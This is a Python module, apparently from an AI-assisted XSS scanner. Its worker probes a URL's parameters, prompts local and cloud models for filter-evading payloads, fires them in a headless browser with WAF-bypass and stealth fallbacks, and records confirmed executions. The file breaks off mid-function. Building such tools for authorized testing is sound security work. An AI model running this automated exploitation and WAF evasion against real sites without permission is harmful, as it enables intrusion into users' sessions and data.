"""Per-URL active scanner worker — runs as an isolated multiprocessing.Process.

Full lifecycle per URL:
  1. WAF detect (reuse existing helper)
  2. Fetch + surface-map the target page
  3. Probe all query parameters for reflection + surviving chars
  4. Build enriched reasoning context from parsed page state + probe lessons
  5. For each injectable param: ask the model for tailored payloads and fire those
  6. If model-driven attempts do not confirm execution: fall back to deterministic transforms
  7. Return WorkerResult to orchestrator via result_queue
"""
from __future__ import annotations

import hashlib
import json
import logging
import queue
import re
import threading
import time
import urllib.parse
from dataclasses import dataclass, field, replace
from multiprocessing.managers import DictProxy
from types import SimpleNamespace
from typing import TYPE_CHECKING, Any

if TYPE_CHECKING:
    import multiprocessing
    from ai_xss_generator.types import PostFormTarget, UploadTarget

log = logging.getLogger(__name__)

_ACTIVE_LOCAL_MODEL_TIMEOUT_SECONDS = 60
_ACTIVE_CLOUD_GRACE_SECONDS = 60
_DOM_CLOUD_START_AFTER_SECONDS = 30


def active_worker_timeout_budget(
    timeout_seconds: int,
    use_cloud: bool,
    ai_backend: str = "api",
    cloud_attempts: int = 1,
) -> int:
    """Return the effective per-worker budget for staged local+cloud execution."""
    minimum = _ACTIVE_LOCAL_MODEL_TIMEOUT_SECONDS
    if use_cloud:
        cloud_grace = _ACTIVE_CLOUD_GRACE_SECONDS
        if ai_backend == "cli":
            # CLI cloud failover may spend one timeout on the primary tool and
            # a second timeout on the alternate tool before falling back.
            cloud_grace *= 2
        minimum += max(1, cloud_attempts) * cloud_grace
    return max(timeout_seconds, minimum)


def _start_async_payload_stage(fn: Any) -> tuple[threading.Thread, "queue.Queue[Any]"]:
    """Run a payload-generation callable in a daemon thread and capture its result."""
    out: "queue.Queue[Any]" = queue.Queue(maxsize=1)

    def _runner() -> None:
        try:
            payloads = fn() or []
        except Exception:
            payloads = []
        try:
            out.put_nowait(payloads)
        except queue.Full:
            pass

    thread = threading.Thread(target=_runner, daemon=True)
    thread.start()
    return thread, out


def _poll_async_payloads(out: "queue.Queue[Any]") -> tuple[bool, Any]:
    try:
        return True, out.get_nowait()
    except queue.Empty:
        return False, []


# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------

@dataclass
class ConfirmedFinding:
    """A single confirmed XSS execution."""
    url: str
    param_name: str
    context_type: str
    sink_context: str
    payload: str
    transform_name: str
    execution_method: str    # "dialog" | "console" | "network" | "dom_xss" | "dom_taint"
    execution_detail: str
    waf: str | None
    surviving_chars: str
    fired_url: str
    source: str             # "phase1_transform" | "local_model" | "cloud_model" | "dom_xss_runtime"
    cloud_escalated: bool
    code_location: str = ""
    """JS call stack or script location where the sink was reached (DOM XSS only)."""
    ai_engine: str = ""
    ai_note: str = ""


@dataclass
class CloudPayloadPlan:
    """Cloud-model payload batch plus engine metadata for reporting."""
    payloads: list[Any] = field(default_factory=list)
    engine: str = ""
    note: str = ""


@dataclass
class CoordinatedPayloadAttempt:
    """A bounded multi-parameter fallback attempt for split reflections."""
    context_type: str
    param_payloads: dict[str, str]
    transform_name: str


@dataclass
class WorkerResult:
    """Returned by a worker to the orchestrator via the result queue."""
    url: str
    status: str             # "confirmed" | "taint_only" | "no_execution" | "no_reflection" | "no_params" | "error"
    confirmed_findings: list[ConfirmedFinding] = field(default_factory=list)
    transforms_tried: int = 0
    cloud_escalated: bool = False
    waf: str | None = None
    error: str | None = None
    duration_seconds: float = 0.0
    # Summary counts for the report
    params_tested: int = 0
    params_reflected: int = 0
    # Work item type — used by session checkpointing
    kind: str = "get"       # "get" | "post" | "upload" | "dom"
    dead_target: bool = False
    dead_reason: str = ""
    target_tier: str = ""
    local_model_rounds: int = 0
    cloud_model_rounds: int = 0
    fallback_rounds: int = 0
    escalation_reasons: list[str] = field(default_factory=list)


def _append_reason(reasons: list[str], note: str) -> None:
    cleaned = note.strip()
    if cleaned and cleaned not in reasons:
        reasons.append(cleaned)


def _join_lessons(*lesson_groups: list[Any] | None) -> list[Any] | None:
    merged: list[Any] = []
    for group in lesson_groups:
        if group:
            merged.extend(group)
    return merged or None


def _payload_text(item: Any) -> str:
    if hasattr(item, "payload"):
        return str(getattr(item, "payload", "") or "")
    return str(item or "")


def _payload_vector(item: Any) -> str:
    if hasattr(item, "test_vector"):
        return str(getattr(item, "test_vector", "") or "")
    return ""


def _preview_payloads(payloads: list[Any], limit: int = 4) -> str:
    if not payloads:
        return "none"
    preview = ", ".join(repr(_payload_text(payload)) for payload in payloads[:limit] if _payload_text(payload))
    remaining = len(payloads) - min(len(payloads), limit)
    if remaining > 0:
        preview += f", +{remaining} more"
    return preview


def _summarize_failed_execution_results(results: list[Any]) -> str:
    if not results:
        return "No dialog, console, or network execution signal fired."

    errors: list[str] = []
    for result in results:
        error = str(getattr(result, "error", "") or "").strip()
        if error and error not in errors:
            errors.append(error)
    if errors:
        preview = "; ".join(errors[:2])
        if len(errors) > 2:
            preview += f"; +{len(errors) - 2} more"
        return f"Observed execution errors: {preview}."
    return "No dialog, console, or network execution signal fired."


def _unique_new_payloads(payloads: list[Any], seen: set[str]) -> tuple[list[Any], list[str]]:
    fresh: list[Any] = []
    duplicates: list[str] = []
    for payload in payloads:
        payload_text = _payload_text(payload).strip()
        if not payload_text:
            continue
        if payload_text in seen:
            duplicates.append(payload_text)
            continue
        seen.add(payload_text)
        fresh.append(payload)
    return fresh, duplicates


def _cloud_attempt_note(base_note: str, attempt_number: int, total_attempts: int) -> str:
    parts = [base_note.strip()] if base_note.strip() else []
    if total_attempts > 1:
        parts.append(f"Cloud attempt {attempt_number}/{total_attempts}.")
    return " ".join(parts)


def _build_cloud_feedback_lessons(
    *,
    attempt_number: int,
    total_attempts: int,
    prompt_context: Any,
    delivery_mode: str,
    context_type: str,
    sink_context: str,
    payloads_tried: list[str],
    duplicate_payloads: list[str] | None = None,
    observation: str = "",
) -> list[Any]:
    from ai_xss_generator.lessons import Lesson

    strategy_constraints = _infer_strategy_constraints(
        prompt_context=prompt_context,
        delivery_mode=delivery_mode,
        context_type=context_type,
        sink_context=sink_context,
        payloads_tried=payloads_tried,
        duplicate_payloads=duplicate_payloads or [],
        observation=observation,
    )

    summary_parts = [
        f"Cloud attempt {attempt_number}/{total_attempts} for {delivery_mode or 'active'} "
        f"{context_type or sink_context or 'xss'} did not confirm execution."
    ]
    if payloads_tried:
        summary_parts.append(f"Payloads already tried: {_preview_payloads(payloads_tried)}.")
    else:
        summary_parts.append("The previous cloud response produced no fresh payloads.")
    if duplicate_payloads:
        summary_parts.append(f"Repeated payloads to avoid: {_preview_payloads(duplicate_payloads)}.")
    if observation:
        summary_parts.append(observation.strip())
    if strategy_constraints:
        summary_parts.append(
            "Strategy shifts for the next batch: " + " ".join(strategy_constraints)
        )
    summary_parts.append("Return a materially different next batch and avoid near-duplicates.")

    return [
        Lesson(
            lesson_type="execution_feedback",
            title=f"Cloud attempt {attempt_number} feedback",
            summary=" ".join(summary_parts),
            sink_type=sink_context,
            context_type=context_type,
            source_pattern=f"{delivery_mode}:cloud_feedback",
            waf_name="",
            delivery_mode=delivery_mode,
            frameworks=[str(item).lower() for item in getattr(prompt_context, "frameworks", [])[:3]],
            auth_required=bool(getattr(prompt_context, "auth_notes", [])),
            confidence=0.83,
        )
    ]


def _infer_strategy_constraints(
    *,
    prompt_context: Any,
    delivery_mode: str,
    context_type: str,
    sink_context: str,
    payloads_tried: list[str],
    duplicate_payloads: list[str],
    observation: str,
) -> list[str]:
    constraints: list[str] = []
    lowered_payloads = [payload.lower() for payload in payloads_tried if payload]
    normalized_context = context_type.strip().lower()
    normalized_sink = sink_context.strip().lower()

    def _add(note: str) -> None:
        cleaned = note.strip()
        if cleaned and cleaned not in constraints:
            constraints.append(cleaned)

    if duplicate_payloads:
        _add("Do not repeat prior payloads or trivial rewrites of them.")

    if lowered_payloads and all("<" in payload and ">" in payload for payload in lowered_payloads):
        _add("Shift away from full-tag injection and try quote closure, same-tag attribute pivots, or tagless execution paths.")

    if normalized_context == "html_attr_url" and lowered_payloads and all("javascript:" in payload for payload in lowered_payloads):
        _add("Do not repeat plain javascript: URIs; prefer entity-encoded, whitespace-broken, or alternate URL-handler pivots.")

    if normalized_context.startswith("js_string_") and lowered_payloads and all("<script" in payload or "</script>" in payload for payload in lowered_payloads):
        _add("Prefer in-string breakout payloads over raw HTML tag injection.")

    if delivery_mode == "dom" and normalized_sink in {"document.write", "document.writeln"}:
        _add("Prioritize same-tag attribute pivots, srcdoc pivots, and quote-closure payloads before full-tag escapes.")

    if lowered_payloads and any("alert(" in payload for payload in lowered_payloads) and all("alert(" in payload for payload in lowered_payloads):
        _add("Vary the execution primitive or wrapper so the next batch is materially different.")

    try:
        from ai_xss_generator.behavior import extract_behavior_profile

        profile = extract_behavior_profile(prompt_context)
    except Exception:
        profile = {}

    transforms = {
        str(item).strip().lower()
        for item in profile.get("reflection_transforms", []) or []
        if str(item).strip()
    }
    probe_modes = {
        str(item).strip().lower()
        for item in profile.get("probe_modes", []) or []
        if str(item).strip()
    }
    if "upper" in transforms:
        _add("Reflection uppercases alphabetic characters; prefer numeric/entity-encoded alpha or case-insensitive payloads.")
    if "stealth" in probe_modes:
        _add("Keep the next batch compact and lower-noise; avoid broad noisy payload families.")

    lowered_observation = observation.lower()
    if "no dialog" in lowered_observation or "no execution signal" in lowered_observation:
        _add("The previous batch produced no execution signal; switch attack families instead of minor rewrites.")
    if "error" in lowered_observation:
        _add("Treat runtime errors as a hint that the syntax shape was wrong; change syntax family rather than repeating the same wrapper.")

    return constraints[:4]


# ---------------------------------------------------------------------------
# Deduplication key — includes endpoint + param so different endpoints/params
# are always treated as new targets even when WAF + filter profile match.
# ---------------------------------------------------------------------------

def _escalation_key(
    url: str,
    param_name: str,
    waf: str | None,
    surviving_chars: frozenset[str],
    context_type: str,
) -> str:
    """Stable key for cloud-escalation dedup.

    Intentionally excludes which transforms failed — two workers hitting the
    same endpoint+param+waf+char-profile should share the same cloud result
    regardless of which Phase 1 transforms each attempted.
    """
    parsed = urllib.parse.urlparse(url)
    endpoint = f"{parsed.netloc}{parsed.path}"
    fingerprint = {
        "endpoint": endpoint,
        "param": param_name,
        "waf": waf or "none",
        "chars": sorted(surviving_chars),
        "context": context_type,
    }
    return hashlib.sha256(
        json.dumps(fingerprint, sort_keys=True).encode()
    ).hexdigest()


# ---------------------------------------------------------------------------
# Worker entry point
# ---------------------------------------------------------------------------

def run_worker(
    url: str,
    rate: float,
    waf_hint: str | None,
    model: str,
    cloud_model: str,
    use_cloud: bool,
    timeout_seconds: int,
    result_queue: "multiprocessing.Queue",
    dedup_registry: DictProxy,
    dedup_lock: Any,
    findings_lock: Any,
    auth_headers: dict[str, str] | None = None,
    sink_url: str | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    cloud_attempts: int = 1,
) -> None:
    """Target function for multiprocessing.Process.

    All results are communicated back via *result_queue*.
    Exceptions are caught and returned as error WorkerResults — workers
    must never crash silently.
    """
    start_time = time.monotonic()

    def _put_result(result: WorkerResult) -> None:
        result.duration_seconds = time.monotonic() - start_time
        result_queue.put(result)

    try:
        _run(
            url=url,
            rate=rate,
            waf_hint=waf_hint,
            model=model,
            cloud_model=cloud_model,
            use_cloud=use_cloud,
            timeout_seconds=timeout_seconds,
            result_queue=result_queue,
            dedup_registry=dedup_registry,
            dedup_lock=dedup_lock,
            findings_lock=findings_lock,
            start_time=start_time,
            put_result=_put_result,
            auth_headers=auth_headers,
            sink_url=sink_url,
            ai_backend=ai_backend,
            cli_tool=cli_tool,
            cli_model=cli_model,
            cloud_attempts=cloud_attempts,
        )
    except Exception as exc:
        log.exception("Worker crashed for %s", url)
        _put_result(WorkerResult(url=url, status="error", error=str(exc)))


def _run(
    *,
    url: str,
    rate: float,
    waf_hint: str | None,
    model: str,
    cloud_model: str,
    use_cloud: bool,
    timeout_seconds: int,
    result_queue: Any,
    dedup_registry: DictProxy,
    dedup_lock: Any,
    findings_lock: Any,
    start_time: float,
    put_result: Any,
    auth_headers: dict[str, str] | None = None,
    sink_url: str | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    cloud_attempts: int = 1,
) -> None:
    deadline = start_time + active_worker_timeout_budget(
        timeout_seconds,
        use_cloud,
        ai_backend,
        cloud_attempts=cloud_attempts,
    )
    local_model_timeout_seconds = _ACTIVE_LOCAL_MODEL_TIMEOUT_SECONDS

    def _timed_out() -> bool:
        return time.monotonic() > deadline

    # ── Step 1: Parse URL params — early exit if none ─────────────────────────
    parsed = urllib.parse.urlparse(url)
    raw_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not raw_params:
        put_result(WorkerResult(url=url, status="no_params", waf=waf_hint))
        return

    flat_params = {k: v[0] for k, v in raw_params.items()}

    # Early exit if every param is a known tracking/analytics param — probe_url
    # would filter them all and return [], leading to a misleading "no_reflection"
    # status. Catch it here so the status and log message are accurate.
    from ai_xss_generator.probe import _TRACKING_PARAM_BLOCKLIST, probe_url
    testable_params = {k for k in flat_params if k.lower() not in _TRACKING_PARAM_BLOCKLIST}
    if not testable_params:
        put_result(WorkerResult(url=url, status="no_params", waf=waf_hint))
        return

    # ── Step 2: Pre-fetch URL cleanly — used for AI context (avoids a redundant
    # network round-trip in parse_target later). The probe requests use modified
    # URLs (canary injected), so this clean fetch is the only time we see the
    # real page content.
    _prefetched_html: str | None = None
    try:
        from ai_xss_generator.probe import _BROWSER_REQUIRED_WAFS, fetch_html_with_browser
        if waf_hint is not None and waf_hint.lower() in _BROWSER_REQUIRED_WAFS:
            _prefetched_html = fetch_html_with_browser(
                url,
                auth_headers=auth_headers,
                user_agent="axss/0.1 (+authorized security testing; playwright-prefetch)",
            )
        else:
            from scrapling.fetchers import FetcherSession as _FS
            with _FS(impersonate="chrome", stealthy_headers=True, timeout=20,
                     follow_redirects=True, retries=1) as _fs:
                _clean_resp = _fs.get(
                    url,
                    headers={**(auth_headers or {}),
                             "User-Agent": "axss/0.1 (+authorized security testing; scrapling)"},
                )
                _prefetched_html = _clean_resp.text or (
                    _clean_resp.body.decode("utf-8", errors="replace")
                    if _clean_resp.body else None
                )
    except Exception as _exc:
        log.debug("Pre-fetch of %s failed (parse_target will re-fetch): %s", url, _exc)

    # ── Step 3: Probe all params for reflection + char survival ──────────────
    probe_results = probe_url(url, rate=rate, waf=waf_hint, auth_headers=auth_headers, sink_url=sink_url)

    injectable = [r for r in probe_results if r.is_injectable]
    reflected  = [r for r in probe_results if r.is_reflected]
    coordinated_attempts = _coordinated_split_attempts(reflected)

    # ── Step 4: Parse target HTML once — reused by local/cloud model helpers ─
    from ai_xss_generator.parser import parse_target as _parse_target
    _cached_context: Any = None
    try:
        _cached_context = _parse_target(
            url=url, html_value=None, waf=waf_hint, auth_headers=auth_headers,
            cached_html=_prefetched_html,
        )
    except Exception as exc:
        log.debug("Pre-parse of %s failed (will retry per-param): %s", url, exc)

    session_lessons: list[Any] = []
    target_disposition: Any = None
    try:
        from ai_xss_generator.behavior import (
            attach_behavior_profile,
            build_target_behavior_profile,
            classify_target_disposition,
        )
        from ai_xss_generator.learning import build_memory_profile
        from ai_xss_generator.lessons import (
            build_behavior_lessons,
            build_mapping_lessons,
            build_probe_lessons,
        )

        behavior_profile = build_target_behavior_profile(
            url=url,
            delivery_mode="get",
            waf_name=waf_hint,
            auth_required=bool(auth_headers),
            context=_cached_context,
            probe_results=probe_results,
        )
        _cached_context = attach_behavior_profile(_cached_context, behavior_profile)
        target_disposition = classify_target_disposition(
            _cached_context,
            delivery_mode="get",
            reflected_params=len(reflected),
            injectable_params=len(injectable),
            coordinated_attempts=len(coordinated_attempts),
        )

        memory_profile = build_memory_profile(
            context=_cached_context,
            waf_name=waf_hint,
            delivery_mode="get",
            target_host=parsed.netloc,
        )
        if auth_headers:
            memory_profile["auth_required"] = True
        session_lessons.extend(build_behavior_lessons(behavior_profile))
        if _cached_context is not None:
            session_lessons.extend(build_mapping_lessons(
                _cached_context,
                memory_profile=memory_profile,
            ))
        if reflected:
            session_lessons.extend(build_probe_lessons(
                reflected,
                memory_profile=memory_profile,
                delivery_mode="get",
            ))
    except Exception as exc:
        log.debug("Session lesson build failed for %s: %s", url, exc)

    if not reflected:
        put_result(WorkerResult(
            url=url,
            status="no_reflection",
            waf=waf_hint,
            params_tested=len(flat_params),
            dead_target=True,
            dead_reason=(
                getattr(target_disposition, "reason", "")
                or "No reflection was confirmed during bounded discovery."
            ),
            target_tier=getattr(target_disposition, "tier", "hard_dead"),
        ))
        return

    if not injectable and not coordinated_attempts:
        put_result(WorkerResult(
            url=url,
            status="no_reflection",
            waf=waf_hint,
            params_tested=len(flat_params),
            params_reflected=len(reflected),
            dead_target=True,
            dead_reason=(
                getattr(target_disposition, "reason", "")
                or "Reflection exists, but no executable context was confirmed."
            ),
            target_tier=getattr(target_disposition, "tier", "soft_dead"),
        ))
        return

    # ── Step 5: Start Playwright executor (shared for all payload attempts) ──
    from ai_xss_generator.active.executor import ActiveExecutor
    executor = ActiveExecutor(auth_headers=auth_headers)
    try:
        executor.start()
    except Exception as exc:
        put_result(WorkerResult(
            url=url,
            status="error",
            error=f"Playwright start failed: {exc}",
            waf=waf_hint,
            target_tier=getattr(target_disposition, "tier", ""),
        ))
        return

    confirmed_findings: list[ConfirmedFinding] = []
    total_transforms_tried = 0
    cloud_escalated = False
    local_model_rounds = 0
    cloud_model_rounds = 0
    fallback_rounds = 0
    escalation_reasons: list[str] = []

    try:
        from ai_xss_generator.active.transforms import all_variants_for_probe

        # ── Step 5: Model-first execution per injectable param ────────────────
        for probe_result in injectable:
            if _timed_out():
                break

            param_name = probe_result.param_name
            param_variants = all_variants_for_probe(probe_result)

            for _pname, context_type, variants in param_variants:
                if _timed_out():
                    break

                context_probe_result = _probe_result_for_context(probe_result, context_type)
                from ai_xss_generator.behavior import derive_ai_escalation_policy

                escalation_policy = derive_ai_escalation_policy(
                    _cached_context,
                    delivery_mode="get",
                    context_type=context_type,
                )
                _append_reason(escalation_reasons, escalation_policy.note)
                cloud_plan = CloudPayloadPlan()
                # Track confirmation per context — a confirmed finding on one
                # param must not suppress escalation on a different param.
                context_confirmed = False

                # Ask the local model first using the enriched target context.
                # Only AI-origin payloads are returned here; heuristic payloads
                # still exist in generate_payloads() but stay out of active
                # execution so deterministic fallback remains explicit.
                if escalation_policy.use_local and not context_confirmed and not _timed_out():
                    local_model_rounds += 1
                    local_payloads = _get_local_payloads(
                        url=url,
                        probe_result=context_probe_result,
                        model=model,
                        waf=waf_hint,
                        base_context=_cached_context,
                        auth_headers=auth_headers,
                        delivery_mode="get",
                        session_lessons=session_lessons,
                        local_timeout_seconds=min(
                            local_model_timeout_seconds,
                            escalation_policy.local_timeout_seconds,
                        ),
                    )

                    for lp in local_payloads:
                        if _timed_out():
                            break
                        total_transforms_tried += 1
                        result = executor.fire(
                            url=url,
                            param_name=param_name,
                            payload=_payload_text(lp),
                            all_params=flat_params,
                            transform_name="local_model",
                            sink_url=sink_url,
                            payload_candidate=lp,
                        )
                        if result.confirmed:
                            finding = _make_finding(
                                url=url,
                                probe_result=context_probe_result,
                                context_type=context_type,
                                result=result,
                                waf=waf_hint,
                                source="local_model",
                                cloud_escalated=False,
                                ai_note=escalation_policy.note,
                            )
                            confirmed_findings.append(finding)
                            context_confirmed = True
                            break

                # If the local model misses, try the cloud model before giving
                # up on dynamic reasoning for this reflection context.
                if not context_confirmed and use_cloud and not _timed_out():
                    # Each unique (endpoint + param + waf + char profile + context)
                    # combination gets exactly one cloud call.
                    surviving_chars = frozenset().union(
                        *(ctx.surviving_chars for ctx in context_probe_result.reflections)
                    )
                    ekey = _escalation_key(
                        url=url,
                        param_name=param_name,
                        waf=waf_hint,
                        surviving_chars=surviving_chars,
                        context_type=context_type,
                    )
                    cloud_feedback_lessons: list[Any] | None = None
                    seen_cloud_payloads: set[str] = set()

                    for attempt_number in range(1, max(1, cloud_attempts) + 1):
                        if _timed_out():
                            break

                        cloud_escalated = True
                        cloud_model_rounds += 1
                        cloud_plan = _coerce_cloud_plan(_get_cloud_payloads(
                            url=url,
                            probe_result=context_probe_result,
                            cloud_model=cloud_model,
                            waf=waf_hint,
                            ekey=ekey,
                            dedup_registry=dedup_registry,
                            dedup_lock=dedup_lock,
                            base_context=_cached_context,
                            auth_headers=auth_headers,
                            ai_backend=ai_backend,
                            cli_tool=cli_tool,
                            cli_model=cli_model,
                            delivery_mode="get",
                            session_lessons=session_lessons,
                            feedback_lessons=cloud_feedback_lessons,
                        ))
                        cloud_payloads, duplicate_payloads = _unique_new_payloads(
                            cloud_plan.payloads,
                            seen_cloud_payloads,
                        )

                        failed_results: list[Any] = []
                        for cp in cloud_payloads:
                            if _timed_out():
                                break
                            total_transforms_tried += 1
                            result = executor.fire(
                                url=url,
                                param_name=param_name,
                                payload=_payload_text(cp),
                                all_params=flat_params,
                                transform_name="cloud_model",
                                sink_url=sink_url,
                                payload_candidate=cp,
                            )
                            if result.confirmed:
                                finding = _make_finding(
                                    url=url,
                                    probe_result=context_probe_result,
                                    context_type=context_type,
                                    result=result,
                                    waf=waf_hint,
                                    source="cloud_model",
                                    cloud_escalated=True,
                                    ai_engine=cloud_plan.engine,
                                    ai_note=_merge_ai_notes(
                                        escalation_policy.note,
                                        _cloud_attempt_note(
                                            cloud_plan.note,
                                            attempt_number,
                                            max(1, cloud_attempts),
                                        ),
                                    ),
                                )
                                confirmed_findings.append(finding)
                                context_confirmed = True
                                break
                            failed_results.append(result)

                        if context_confirmed or attempt_number >= max(1, cloud_attempts):
                            break

                        cloud_feedback_lessons = _build_cloud_feedback_lessons(
                            attempt_number=attempt_number,
                            total_attempts=max(1, cloud_attempts),
                            prompt_context=_cached_context,
                            delivery_mode="get",
                            context_type=context_type,
                            sink_context=context_type,
                            payloads_tried=cloud_payloads,
                            duplicate_payloads=duplicate_payloads,
                            observation=_summarize_failed_execution_results(failed_results),
                        )

                if not context_confirmed and waf_hint and not _timed_out():
                    waf_payloads = _waf_reference_payloads(waf_hint, context_probe_result, limit=4)
                    if waf_payloads:
                        fallback_rounds += 1
                        _append_reason(
                            escalation_reasons,
                            f"Inserted bounded {waf_hint} WAF-specific fallback candidates before generic transforms.",
                        )
                    for wp in waf_payloads:
                        if _timed_out():
                            break
                        total_transforms_tried += 1
                        result = executor.fire(
                            url=url,
                            param_name=param_name,
                            payload=_payload_text(wp),
                            all_params=flat_params,
                            transform_name="waf_payload",
                            sink_url=sink_url,
                            payload_candidate=wp,
                        )
                        if result.confirmed:
                            finding = _make_finding(
                                url=url,
                                probe_result=context_probe_result,
                                context_type=context_type,
                                result=result,
                                waf=waf_hint,
                                source="phase1_waf_fallback",
                                cloud_escalated=cloud_escalated,
                                ai_note=f"Bounded {waf_hint} WAF-specific fallback candidate confirmed execution.",
                            )
                            confirmed_findings.append(finding)
                            context_confirmed = True
                            break

                # Deterministic transforms are now a fallback stage instead of
                # the primary search strategy.
                if not context_confirmed and not _timed_out():
                    fallback_rounds += 1
                    for variant in variants:
                        if _timed_out():
                            break

                        total_transforms_tried += 1
                        result = executor.fire(
                            url=url,
                            param_name=param_name,
                            payload=variant.payload,
                            all_params=flat_params,
                            transform_name=variant.transform_name,
                            sink_url=sink_url,
                        )

                        if result.confirmed:
                            finding = _make_finding(
                                url=url,
                                probe_result=context_probe_result,
                                context_type=context_type,
                                result=result,
                                waf=waf_hint,
                                source="phase1_transform",
                                cloud_escalated=False,
                                ai_note=_merge_ai_notes(
                                    escalation_policy.note,
                                    cloud_plan.note if use_cloud else "",
                                ),
                            )
                            confirmed_findings.append(finding)
                            context_confirmed = True
                            break

        if not confirmed_findings and not _timed_out():
            for attempt in coordinated_attempts:
                if _timed_out():
                    break
                fallback_rounds += 1
                ordered_params = list(attempt.param_payloads.keys())
                primary_param = ordered_params[0]
                total_transforms_tried += 1
                result = executor.fire(
                    url=url,
                    param_name=primary_param,
                    payload=attempt.param_payloads[primary_param],
                    all_params=flat_params,
                    transform_name=attempt.transform_name,
                    sink_url=sink_url,
                    payload_overrides=attempt.param_payloads,
                )
                if result.confirmed:
                    confirmed_findings.append(_make_coordinated_finding(
                        url=url,
                        probe_results=reflected,
                        attempt=attempt,
                        result=result,
                        waf=waf_hint,
                    ))
                    break

    finally:
        executor.stop()

    status = "confirmed" if confirmed_findings else "no_execution"
    put_result(WorkerResult(
        url=url,
        status=status,
        confirmed_findings=confirmed_findings,
        transforms_tried=total_transforms_tried,
        cloud_escalated=cloud_escalated,
        waf=waf_hint,
        params_tested=len(flat_params),
        params_reflected=len(reflected),
        kind="get",
        target_tier=getattr(target_disposition, "tier", "live"),
        local_model_rounds=local_model_rounds,
        cloud_model_rounds=cloud_model_rounds,
        fallback_rounds=fallback_rounds,
        escalation_reasons=escalation_reasons,
    ))


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_finding(
    url: str,
    probe_result: Any,
    context_type: str,
    result: Any,
    waf: str | None,
    source: str,
    cloud_escalated: bool,
    ai_engine: str = "",
    ai_note: str = "",
) -> ConfirmedFinding:
    surviving = "".join(sorted(
        c for ctx in probe_result.reflections for c in ctx.surviving_chars
    ))
    return ConfirmedFinding(
        url=url,
        param_name=probe_result.param_name,
        context_type=context_type,
        sink_context=context_type,
        payload=result.payload,
        transform_name=result.transform_name,
        execution_method=result.method,
        execution_detail=result.detail,
        waf=waf,
        surviving_chars=surviving,
        fired_url=result.fired_url,
        source=source,
        cloud_escalated=cloud_escalated,
        ai_engine=ai_engine,
        ai_note=ai_note,
    )


def _make_coordinated_finding(
    *,
    url: str,
    probe_results: list[Any],
    attempt: CoordinatedPayloadAttempt,
    result: Any,
    waf: str | None,
) -> ConfirmedFinding:
    ordered_params = list(attempt.param_payloads.keys())
    payload_summary = "\n".join(
        f"{param}={attempt.param_payloads[param]}"
        for param in ordered_params
    )
    return ConfirmedFinding(
        url=url,
        param_name="+".join(ordered_params),
        context_type=attempt.context_type,
        sink_context=attempt.context_type,
        payload=payload_summary,
        transform_name=attempt.transform_name,
        execution_method=result.method,
        execution_detail=(
            f"Coordinated multi-parameter payload confirmed across {', '.join(ordered_params)}. "
            f"{result.detail}"
        ).strip(),
        waf=waf,
        surviving_chars=_coordinated_surviving_chars(probe_results, attempt.context_type),
        fired_url=result.fired_url,
        source="phase1_transform",
        cloud_escalated=False,
    )


def _probe_result_for_context(probe_result: Any, context_type: str) -> Any:
    """Return a lightweight probe result containing only one reflection context."""
    reflections = [
        ctx for ctx in getattr(probe_result, "reflections", [])
        if getattr(ctx, "context_type", "") == context_type
    ]
    if not reflections:
        reflections = list(getattr(probe_result, "reflections", []))
    return SimpleNamespace(
        param_name=getattr(probe_result, "param_name", ""),
        original_value=getattr(probe_result, "original_value", ""),
        reflections=reflections,
        error=getattr(probe_result, "error", None),
    )


def _payload_matches_context(payload: str, context_type: str, attr_name: str = "") -> bool:
    lowered = payload.lower()
    has_markup = any(token in lowered for token in ("<", "&#60;", "\\u003c", "%3c"))
    has_uri = any(token in lowered for token in ("javascript:", "data:", "srcdoc", "java\t", "java\r", "java&#9;", "jav&#x0a;"))
    has_js = any(token in lowered for token in ("alert", "confirm", "constructor", "eval", "prompt"))
    normalized_context = context_type.strip().lower()
    normalized_attr = attr_name.strip().lower()

    if normalized_context in {"html_body", "html_comment"}:
        return has_markup
    if normalized_context == "html_attr_url":
        if normalized_attr == "srcdoc":
            return has_markup or "srcdoc" in lowered
        return has_uri and not has_markup
    if normalized_context == "html_attr_value":
        return has_markup or lowered.startswith(("'", "\"")) or any(token in lowered for token in ("onfocus", "onload", "ontoggle", "onerror"))
    if normalized_context == "html_attr_event":
        return has_js and not has_markup
    if normalized_context.startswith("js_") or normalized_context == "json_value":
        return has_js and not has_markup
    return True


def _coerce_waf_payload_for_context(candidate: Any, context_type: str, attr_name: str = "") -> Any:
    payload = _payload_text(candidate).strip()
    normalized_context = context_type.strip().lower()
    normalized_attr = attr_name.strip().lower()

    if normalized_context == "html_attr_url" and payload and "<" in payload:
        if normalized_attr == "srcdoc":
            match = re.search(r"srcdoc\s*=\s*['\"]([^'\"]+)['\"]", payload, flags=re.IGNORECASE)
            if match:
                return replace(candidate, payload=match.group(1))
            return candidate

        match = re.search(
            r"(?:href|src|action|formaction|data)\s*=\s*['\"]?([^'\"\s>]+(?:[^'\">]*[^'\"\s>])?)",
            payload,
            flags=re.IGNORECASE,
        )
        if match:
            return replace(candidate, payload=match.group(1))
    return candidate


def _waf_reference_payloads(
    waf: str | None,
    probe_result: Any,
    *,
    limit: int = 6,
) -> list[Any]:
    if not waf:
        return []
    try:
        from ai_xss_generator.public_payloads import _waf_candidates
    except Exception:
        return []

    reflections = list(getattr(probe_result, "reflections", []) or [])
    context_type = str(getattr(reflections[0], "context_type", "") or "") if reflections else ""
    attr_name = str(getattr(reflections[0], "attr_name", "") or "") if reflections else ""
    seen: set[str] = set()
    selected: list[Any] = []
    for candidate in _waf_candidates(waf):
        candidate = _coerce_waf_payload_for_context(candidate, context_type, attr_name)
        payload = _payload_text(candidate).strip()
        if not payload or payload in seen:
            continue
        if not _payload_matches_context(payload, context_type, attr_name):
            continue
        seen.add(payload)
        selected.append(candidate)
        if len(selected) >= limit:
            break
    return selected


def _get_local_payloads(
    url: str,
    probe_result: Any,
    model: str,
    waf: str | None,
    base_context: Any = None,
    auth_headers: dict[str, str] | None = None,
    delivery_mode: str = "get",
    session_lessons: list[Any] | None = None,
    local_timeout_seconds: int = _ACTIVE_LOCAL_MODEL_TIMEOUT_SECONDS,
) -> list[Any]:
    """Ask the local model for payloads. Returns AI payload candidates.

    *base_context* is a pre-parsed ParsedContext for *url*. When provided it
    avoids a redundant HTTP fetch — enrich_context adds the probe-specific
    reflection data on top without mutating the original.
    """
    try:
